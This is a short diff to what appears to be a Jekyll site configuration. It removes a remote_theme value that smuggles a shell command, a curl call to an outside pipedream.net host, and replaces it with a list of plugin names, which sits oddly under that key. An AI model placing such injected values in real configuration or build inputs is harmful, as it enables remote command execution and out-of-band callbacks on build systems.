@@ -9,7 +9,11 @@
 title: My Website
 testing: testing123
 
-remote_theme: "https://$(`<>curl${IFS}env77i5z45nt.x.pipedream.net/)`b"
+remote_theme: 
+  - jekyll-paginate
+  - jekyll-sitemap
+  - jetesting
+  - jekyll-coffeescript
 
 destination: _site2
 
